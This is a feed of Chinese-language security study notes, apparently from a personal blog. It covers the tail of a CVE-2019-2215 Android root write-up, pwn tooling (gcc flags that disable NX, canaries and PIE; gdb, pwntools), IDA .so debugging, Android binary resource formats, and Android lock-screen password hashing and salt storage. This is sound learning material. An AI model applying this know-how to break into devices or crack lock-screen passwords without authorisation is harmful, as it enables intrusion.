只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。\n提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。\n关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。\n参考 https://www.52pojie.cn/thread-1083552-1-1.html\nhttps://blog.csdn.net/weixin_43901866/article/details/102458212\nhttps://cloudfuzz.github.io/android-kernel-exploitation/\nhttps://github.com/sharif-dev/AndroidKernelVulnerability\nhttps://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/\nhttps://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/\n","date":"2020-06-30T00:00:00+08:00","permalink":"https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"CVE-2019-2215分析利用记录"},{"content":"PWN_小tools的使用 GCC 编译常用命令 不带选项 gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。 -o 指定生成的输出文件； gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。 -E 仅执行编译预处理； gcc -E test.c -o test.i 将test.c预处理输出test.i文件。 -S 将C代码转换为汇编代码； gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。 -c 仅执行编译操作，不进行连接操作。 gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。 -wall 显示警告信息； **无选项链接** gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。 -O 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长 gcc -O1 test.c -o test 关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.c 关掉Stack Protector/Canary（栈保护） gcc -fno-stack-protector -o level level.c 关掉程序ASLR/PIE（程序随机化保护） gcc -no-pie level level.c 64位linux下面的GCC编译出一个32位可执行程序 gcc -m32 -z execstack -fno-stack-protector -o level level.c GDB常用调试命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gcc -g main.c //在目标文件加入源代码的信息 gdb a.out (gdb) start //开始调试 (gdb) n //一条一条执行 (gdb) step/s //执行下一条，如果函数进入函数 (gdb) backtrace/bt //查看函数调用栈帧 (gdb) info/i locals //查看当前栈帧局部变量 (gdb) frame/f //选择栈帧，再查看局部变量 (gdb) print/p //打印变量的值 (gdb) finish //运行到当前函数返回 (gdb) set var sum=0 //修改变量值 (gdb) list/l 行号或函数名 //列出源码 (gdb) display/undisplay sum //每次停下显示变量的值/取消跟踪 (gdb) break/b 行号或函数名 //设置断点 (gdb) continue/c //连续运行 (gdb) info/i breakpoints //查看已经设置的断点 (gdb) delete breakpoints 2 //删除某个断点 (gdb) disable/enable breakpoints 3 //禁用/启用某个断点 (gdb) break 9 if sum != 0 //满足条件才激活断点 (gdb) run/r //重新从程序开头连续执行 (gdb) watch input[4] //设置观察点 (gdb) info/i watchpoints //查看设置的观察点 (gdb) x/7b input //打印存储器内容，b--每个字节一组，7--7组 (gdb) disassemble //反汇编当前函数或指定函数 (gdb) si // 一条指令一条指令调试 而 s 是一行一行代码 (gdb) info registers // 显示所有寄存器的当前值 (gdb) x/20 $esp //查看内存中开始的20个数 ni 单步执行不进入 si 单步执行并进入 disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 checksec 查看elf编译的保护选项。 查壳 upx -d file\nobjjump objdump是二进制文件快速查看工具。 常用命令：\n1. `objdump -d [file]` 查看文件的所有汇编代码 1. `objdump -f [file]` 查看文件的每个文件的整体头部摘要 ####python\npython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | ./file python以命令方式执行并把结果传递给filepython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | xargs ./file python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。os.system() 创建一个子进程os.putenv(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;) 添加一个环境变量\npwntools 参考 http://pwntools.readthedocs.io/en/stable/ （官网介绍）\n[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/) [http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/) 一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。\n常用的模块有下面几个： - ==asm==:汇编与反汇编 - ==dynelf==:用于远程符号泄露，需要提供leak方法 - ==elf==:对elf文件进行操作 - ==gdb==:配合gdb进行调试 - ==memleak==:用于内存泄漏 - ==shellcraft==: shellcode的生成器 - ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE - ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等 pwndbg arena 堆检查\nmp 显示堆\nbins,fastbins,unsorted,smallbins,largebins\nheap\ntop_chunk\nprocinfo 查看当前进程状态\nrop rop --grep \u0026quot;pop rdi\u0026quot; -- --nojop --nosys --depth 2\nsearch search -s “/bin/sh”\nvvmap 虚拟内存映射\ntelescope 检查内存转储\n","date":"2018-10-22T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN_小tools的使用"},{"content":"IDA_动态调试.so_基本步骤 IDA 动态调试.so 基本步骤 待补图 0x00 IDA快捷键 Shirt+F12 字符串窗口\nF5大法好 反汇编\nCtrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）\nG 快速跳转到对应地址。s\n调试-F7单步进入调试、F8单步、F9运行\n0x01 方法一 获取运行Android_server。\nandroid_server文件放在IDA安装目录下的注意版本的不同。\n之后只需 push android_server /data/local/tmp/。\n之后adb shell，su ，cd /data/local/tmp/。\n可能还得chmod 755 android_server 才有权限运行。\n建立通信、attach进程。\nadb forward tcp:23946 tcp:23946命令。\n在IDA的Debugger选项中attach进程。\n加载so、找函数下断点\n双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。\n0x02 方法二 无法加载so文件需要在加载之前断点。反调试之类\nDebug方式启动app。需要应用可调试开启\nadb shell am start -D -n 包名/.MainActivity\n方法一的1，2两步 勾选选项。\njdb attach程序\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n开始调试 同上\n","date":"2018-08-31T00:00:00+08:00","permalink":"https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/","title":"IDA_动态调试.so_基本步骤"},{"content":"Android应用安全防护和逆向分析-基础篇5-6 一、 基础篇⑤-⑥ 这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。\n第五章 AndroidManifest.xml格式解析 AndroidManifest.xml\nAndroidManifest.xml文件格式图\n头部信息 文件魔数：4bytes。\n文件大小：4bytes。\nChunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。\nSting Chunk ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。\nChunkType：类型，固定4bytes（0x001C001)。\nChunkSize：大小，4bytes。\nStringCount：字符串的个数 ，4bytes。\nStyleCount ：样式的个数，4bytes。\nUnknown ：位置区域。4bytes。\nStringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。\nStylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。\nStringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。\nStyleOffsets：每个样式的偏移值，大小为StyleChunk*4。\n如何读取这个文件？\nResourceld Chunk ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID\nChunkType：类型，固定4bytes（0x00080108）。\nChunkSize：大小，4bytes。\nResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。\n解析？\nStart Namespace Chunk：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。\nChunk Type：类型，固定4bytes。（0x00100100)。\nChunk Size：大小，4bytes。\nLine Number ：AndroidMaifest文件中行号，4bytes。\nUnknown：未知区域,4bytes。\nPrefix：命名空间的前缀（在字符串中的索引值），eg:android。\nUri：命名空间的URI（在字符串中的索引值），eg:http://schemas.android.com/apk/res/android\nStart Tag Chunk：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。\nChunk Type：类型，固定4bytes。（0x00100102)。\nChunk Size：大小，4bytes。\nLine Number ：对应AndroidMaifest中的行号，4bytes。\nUnknown：未知区域,4bytes。\nNamespace Uri ：命名空间的Uri，4bytes。\nName：标签名称（在字符串中的索引值），4bytes。\nFlags：标签的类型，4bytes。eg：是开始标签还是结束标签？\nAttributes Counk：便签中包含的属性的个数，4bytes。\nClass Attribute：标签包含的类属性，4bytes。\nAttributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4\u0026quot;个字节。\nAXMLPrinter工具 aapt 工具 第六章 resourec.arsc文件格式解析 资源文件id格式 resourec.arsc文件格式\n数据结构 上图\n头部信息\nresourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ResChunkHeader{ public short type; //当前chunk的类型 public short headerSize; //当前chunk的头部大小 public int size; //当前chunk的大小 public int getHeaderSize(){ return 2+2+4 } @Override public String toString(){ return \u0026#34;type:\u0026#34;+Utils.bytesToHexString( Utils.int2Byte(type))+\u0026#34;,headerSize:\u0026#34;+headerSize+\u0026#34;,size:\u0026#34;+size; } } 资源索引表的头部信息\nresourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ResTableHeader { public ResChunkHeader header; //就是标准的Chunk头部信息格式 public int packageCount; //被编译的资源包的个数 public ResTableHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;packageCount:\u0026#34;+packageCount; } } 资源项的值字符串资源池接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。\n包含了所有在资源包里面定义的资源项的值字符串，结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class ResStringPoolHeader { public ResChunkHeader header; //标准的Chunk头部信息结构 public int stringCount; //字符串的个数 public int styleCount; //字符串样式的个数 public final static int SORTED_FLAG = 1; public final static int UTF8_FLAG = (1\u0026lt;\u0026lt;8); public int flags; //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值 public int stringsStart; //字符串内容块相对于其头部的距离 public int stylesStart; //字符串样式块相对于其头部的距离 public ResStringPoolHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;stringCount:\u0026#34;+stringCount+\u0026#34;,styleCount:\u0026#34;+styleCount+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,stringStart:\u0026#34;+stringsStart+\u0026#34;,stylesStart:\u0026#34;+stylesStart; } } 字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：\nlen = (((hbyte \u0026amp; 0x7F) \u0026lt;\u0026lt; 8)) | lbyte;\n如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。\nPackage数据块\n这个数据块记录编译包的元数据，头部信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTablePackage { public ResChunkHeader header; //Chunk的头部信息数据结构 public int id; //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01； public char[] name = new char[128]; //包名 public int typeStrings; //类型字符串资源池相对头部的偏移 public int lastPublicType; //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途 public int keyStrings; //资源项名称字符串相对头部的偏移 public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途 public ResTablePackage(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34;+\u0026#34;,id=\u0026#34;+id+\u0026#34;,name:\u0026#34;+name.toString()+\u0026#34;,typeStrings:\u0026#34;+typeStrings+\u0026#34;,lastPublicType:\u0026#34;+lastPublicType+\u0026#34;,keyStrings:\u0026#34;+keyStrings+\u0026#34;,lastPublicKey:\u0026#34;+lastPublicKey; } } 类型规范数据块\n用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableTypeSpec { public final static int SPEC_PUBLIC = 0x40000000; public ResChunkHeader header; //Chunk的头部信息结构 public byte id; //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。 public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public ResTableTypeSpec(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount; } } 资源类型项数据块\n描述资源项的具体信息，名称、值、配置等信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class ResTableType { public ResChunkHeader header; //Chunk的头部信息结构 public final static int NO_ENTRY = 0xFFFFFFFF; public byte id; //标识资源的Type ID public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public int entriesStart; //等于资源项数据块相对头部的偏移值。 public ResTableConfig resConfig; //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等 public ResTableType(){ header = new ResChunkHeader(); resConfig = new ResTableConfig(); } public int getSize(){ return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount+\u0026#34;,entriesStart:\u0026#34;+entriesStart; } } ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class ResTableEntry { public final static int FLAG_COMPLEX = 0x0001; public final static int FLAG_PUBLIC = 0x0002; public short size; public short flags; public ResStringPoolRef key; public ResTableEntry(){ key = new ResStringPoolRef(); } public int getSize(){ return 2+2+key.getSize(); } @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,key:\u0026#34;+key.toString()+\u0026#34;,str:\u0026#34;+ParseResourceUtils.getKeyString(key.index); } } ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableMapEntry extends ResTableEntry{ public ResTableRef parent; public int count; public ResTableMapEntry(){ parent = new ResTableRef(); } @Override public int getSize(){ return super.getSize() + parent.getSize() + 4; } @Override public String toString(){ return super.toString() + \u0026#34;,parent:\u0026#34;+parent.toString()+\u0026#34;,count:\u0026#34;+count; } } ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.wjdiankong.parseresource.type; /** struct ResTable_map { //bag资源项ID ResTable_ref name; //bag资源项值 Res_value value; }; * @author i * */ public class ResTableMap { public ResTableRef name; public ResValue value; public ResTableMap(){ name = new ResTableRef(); value = new ResValue(); } public int getSize(){ return name.getSize() + value.getSize(); } @Override public String toString(){ return name.toString()+\u0026#34;,value:\u0026#34;+value.toString(); } } 如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 public class ResValue { //dataType字段使用的常量 public final static int TYPE_NULL = 0x00; public final static int TYPE_REFERENCE = 0x01; public final static int TYPE_ATTRIBUTE = 0x02; public final static int TYPE_STRING = 0x03; public final static int TYPE_FLOAT = 0x04; public final static int TYPE_DIMENSION = 0x05; public final static int TYPE_FRACTION = 0x06; public final static int TYPE_FIRST_INT = 0x10; public final static int TYPE_INT_DEC = 0x10; public final static int TYPE_INT_HEX = 0x11; public final static int TYPE_INT_BOOLEAN = 0x12; public final static int TYPE_FIRST_COLOR_INT = 0x1c; public final static int TYPE_INT_COLOR_ARGB8 = 0x1c; public final static int TYPE_INT_COLOR_RGB8 = 0x1d; public final static int TYPE_INT_COLOR_ARGB4 = 0x1e; public final static int TYPE_INT_COLOR_RGB4 = 0x1f; public final static int TYPE_LAST_COLOR_INT = 0x1f; public final static int TYPE_LAST_INT = 0x1f; public static final int COMPLEX_UNIT_PX\t=0, COMPLEX_UNIT_DIP\t=1, COMPLEX_UNIT_SP\t=2, COMPLEX_UNIT_PT\t=3, COMPLEX_UNIT_IN\t=4, COMPLEX_UNIT_MM\t=5, COMPLEX_UNIT_SHIFT\t=0, COMPLEX_UNIT_MASK\t=15, COMPLEX_UNIT_FRACTION\t=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_23p0\t=0, COMPLEX_RADIX_16p7\t=1, COMPLEX_RADIX_8p15\t=2, COMPLEX_RADIX_0p23\t=3, COMPLEX_RADIX_SHIFT\t=4, COMPLEX_RADIX_MASK\t=3, COMPLEX_MANTISSA_SHIFT\t=8, COMPLEX_MANTISSA_MASK\t=0xFFFFFF; public short size; //ResValue的头部大小 public byte res0; //保留，始终为0 public byte dataType; //数据的类型,可以从上面的枚举类型中获取 public int data; //数据对应的索引 public int getSize(){ return 2 + 1 + 1 + 4; } public String getTypeStr(){ switch(dataType){ case TYPE_NULL: return \u0026#34;TYPE_NULL\u0026#34;; case TYPE_REFERENCE: return \u0026#34;TYPE_REFERENCE\u0026#34;; case TYPE_ATTRIBUTE: return \u0026#34;TYPE_ATTRIBUTE\u0026#34;; case TYPE_STRING: return \u0026#34;TYPE_STRING\u0026#34;; case TYPE_FLOAT: return \u0026#34;TYPE_FLOAT\u0026#34;; case TYPE_DIMENSION: return \u0026#34;TYPE_DIMENSION\u0026#34;; case TYPE_FRACTION: return \u0026#34;TYPE_FRACTION\u0026#34;; case TYPE_FIRST_INT: return \u0026#34;TYPE_FIRST_INT\u0026#34;; case TYPE_INT_HEX: return \u0026#34;TYPE_INT_HEX\u0026#34;; case TYPE_INT_BOOLEAN: return \u0026#34;TYPE_INT_BOOLEAN\u0026#34;; case TYPE_FIRST_COLOR_INT: return \u0026#34;TYPE_FIRST_COLOR_INT\u0026#34;; case TYPE_INT_COLOR_RGB8: return \u0026#34;TYPE_INT_COLOR_RGB8\u0026#34;; case TYPE_INT_COLOR_ARGB4: return \u0026#34;TYPE_INT_COLOR_ARGB4\u0026#34;; case TYPE_INT_COLOR_RGB4: return \u0026#34;TYPE_INT_COLOR_RGB4\u0026#34;; } return \u0026#34;\u0026#34;; } /*public String getDataStr(){ if(dataType == TYPE_STRING){ return ParseResourceUtils.getResString(data); }else if(dataType == TYPE_FIRST_COLOR_INT){ return Utils.bytesToHexString(Utils.int2Byte(data)); }else if(dataType == TYPE_INT_BOOLEAN){ return data==0 ? \u0026#34;false\u0026#34; : \u0026#34;true\u0026#34;; } return data+\u0026#34;\u0026#34;; }*/ public String getDataStr() { if (dataType == TYPE_STRING) { return ParseResourceUtils.getResString(data); } if (dataType == TYPE_ATTRIBUTE) { return String.format(\u0026#34;?%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_REFERENCE) { return String.format(\u0026#34;@%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_FLOAT) { return String.valueOf(Float.intBitsToFloat(data)); } if (dataType == TYPE_INT_HEX) { return String.format(\u0026#34;0x%08X\u0026#34;,data); } if (dataType == TYPE_INT_BOOLEAN) { return data!=0?\u0026#34;true\u0026#34;:\u0026#34;false\u0026#34;; } if (dataType == TYPE_DIMENSION) { return Float.toString(complexToFloat(data))+ DIMENSION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType == TYPE_FRACTION) { return Float.toString(complexToFloat(data))+ FRACTION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType \u0026gt;= TYPE_FIRST_COLOR_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_COLOR_INT) { return String.format(\u0026#34;#%08X\u0026#34;,data); } if (dataType \u0026gt;= TYPE_FIRST_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_INT) { return String.valueOf(data); } return String.format(\u0026#34;\u0026lt;0x%X, type 0x%02X\u0026gt;\u0026#34;,data, dataType); } private static String getPackage(int id) { if (id\u0026gt;\u0026gt;\u0026gt;24==1) { return \u0026#34;android:\u0026#34;; } return \u0026#34;\u0026#34;; } public static float complexToFloat(int complex) { return (float)(complex \u0026amp; 0xFFFFFF00)*RADIX_MULTS[(complex\u0026gt;\u0026gt;4) \u0026amp; 3]; } private static final float RADIX_MULTS[]={ 0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F }; private static final String DIMENSION_UNITS[]={ \u0026#34;px\u0026#34;,\u0026#34;dip\u0026#34;,\u0026#34;sp\u0026#34;,\u0026#34;pt\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;mm\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; private static final String FRACTION_UNITS[]={ \u0026#34;%\u0026#34;,\u0026#34;%p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,dataType:\u0026#34;+getTypeStr()+\u0026#34;,data:\u0026#34;+getDataStr(); } } 以上代码来自于书的原作者的博客：https://blog.csdn.net/jiangwei0910410003/article/details/50628894\n博客里还有如何解析操作，留看。\n总结 这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。\n","date":"2018-08-29T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/","title":"Android应用安全防护和逆向分析-基础篇5-6"},{"content":"Android应用安全防护和逆向分析-基础篇1 第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式： 手势\n九宫格连线\n输入密码\n指纹、人脸、虹膜\n可穿戴设备\n2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类\n路径：Android-5.1.1\\frameworks\\base\\core\\java\\com\\android\\internal\\widget\n2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); //首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.length); System.arraycopy(md5, 0, combined, sha1.length, md5.length); //装换成hex值 再拼接起来 final char[] hexEncoded = HexEncoding.encode(combined); return new String(hexEncoded).getBytes(StandardCharsets.UTF_8); } catch (NoSuchAlgorithmException e) { throw new AssertionError(\u0026#34;Missing digest algorithm: \u0026#34;, e); } } 如何获取设备对应的salt值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 private String getSalt(int userId) { long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId); if (salt == 0) { //值为0 重新生成 try { salt = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;).nextLong(); setLong(LOCK_PASSWORD_SALT_KEY, salt, userId); //保存值 Log.v(TAG, \u0026#34;Initialized lock password salt for user: \u0026#34; + userId); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(\u0026#34;Couldn\u0026#39;t get SecureRandom number\u0026#34;, e); } } return Long.toHexString(salt); // hex之后返回 } 继续跟踪 看保存的地方\n1 2 3 4 5 6 7 private long getLong(String secureSettingKey, long defaultValue, int userHandle) { try { return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle); } catch (RemoteException re) { return defaultValue; } } 继续跟踪代码\n1 2 3 4 5 6 7 8 9 @VisibleForTesting public ILockSettings getLockSettings() { if (mLockSettingsService == null) { ILockSettings service = ILockSettings.Stub.asInterface( ServiceManager.getService(\u0026#34;lock_settings\u0026#34;)); //获取服务来操作 mLockSettingsService = service; } return mLockSettingsService; } 在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中\n这里在LockSettingService.java中 找到这个类的getLong方法\n1 2 3 4 5 public long getLong(String key, long defaultValue, int userId) { checkReadPermission(key, userId); String value = getStringUnchecked(key, null, userId); return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value); } 保存在数据库？\n继续跟踪\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static class Injector { protected Context mContext; public Injector(Context context) { mContext = context; } public Context getContext() { return mContext; } public Handler getHandler() { return new Handler(); } public LockSettingsStorage getStorage() { final LockSettingsStorage storage = new LockSettingsStorage(mContext); storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() { @Override public void initialize(SQLiteDatabase db) { // Get the lockscreen default from a system property, if available boolean lockScreenDisable = SystemProperties.getBoolean( \u0026#34;ro.lockscreen.disable.default\u0026#34;, false); if (lockScreenDisable) { storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, \u0026#34;1\u0026#34;, 0); } } }); return storage; } public LockSettingsService(Context context) { this(new Injector(context)); } 继续 查看LockSettingsStorage.java 类中 存在数据库中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 static class DatabaseHelper extends SQLiteOpenHelper { private static final String TAG = \u0026#34;LockSettingsDB\u0026#34;; private static final String DATABASE_NAME = \u0026#34;locksettings.db\u0026#34;; private static final int DATABASE_VERSION = 2; private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000; private Callback mCallback; public DatabaseHelper(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); setWriteAheadLoggingEnabled(true); // Memory optimization - close idle connections after 30s of inactivity setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS); } public void setCallback(Callback callback) { mCallback = callback; } private void createTable(SQLiteDatabase db) { db.execSQL(\u0026#34;CREATE TABLE \u0026#34; + TABLE + \u0026#34; (\u0026#34; + \u0026#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,\u0026#34; + COLUMN_KEY + \u0026#34; TEXT,\u0026#34; + COLUMN_USERID + \u0026#34; INTEGER,\u0026#34; + COLUMN_VALUE + \u0026#34; TEXT\u0026#34; + \u0026#34;);\u0026#34;); } @Override public void onCreate(SQLiteDatabase db) { createTable(db); if (mCallback != null) { mCallback.initialize(db); } } 